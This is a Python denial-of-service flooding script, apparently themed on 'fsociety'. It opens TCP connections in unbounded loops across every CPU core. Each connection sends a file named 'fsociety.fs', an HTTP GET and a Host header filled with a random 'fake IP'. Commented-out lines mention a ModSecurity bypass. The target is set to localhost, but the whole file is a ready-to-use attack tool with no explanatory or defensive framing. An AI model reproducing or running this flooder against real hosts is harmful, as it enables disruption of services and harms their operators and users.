import socket
import threading
from random import randint
from multiprocessing import Process, cpu_count

# FIXME: [302] Broken pip fix temporary
from signal import signal, SIGPIPE, SIG_DFL
signal(SIGPIPE,SIG_DFL)

# FIXME: Vars should be imported from a consts file
target = 'localhost'
port = 80

# FIXME: headers for Mod_Security bypass
# headers = {
#      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
# }

# FIXME: Will data=payload (requests) be necessary?
# payload = {'fsociety': 'ur done'}

attack_num = 0
file_name = 'fsociety.fs'


def gen_ip():
    ip = '.'.join([str(randint(20, 182)) for x in range(4)])
    return ip


fake_ip = gen_ip()


def attack():
    global fake_ip
    global attack_num
    global file_name

    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(file_name.encode())
            print(f'File name sent: {file_name}')
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            with open(file_name, 'rb') as f:
                while True:
                    data = f.read(1024)

                    if not data:
                        break

                    s.send(data)

            attack_num += 1
            print(attack_num)
            s.close()
    except ConnectionRefusedError:
        raise
    # FIXME: Analyze the possible exceptions and properly handle them
    except Exception as e:
        print(e)
        raise
        # fake_ip = gen_ip()
        # attack()


def start_attack():
    while True:
        attack()


if __name__ == '__main__':
    processes = []

    num_cores = cpu_count()

    for i in range(num_cores):
        thread = threading.Thread(target=start_attack)
        thread.start()

    for i in range(num_cores):
        process = Process(target=start_attack)
        process.start()
        processes.append(process)

    for process in processes:
        process.join()
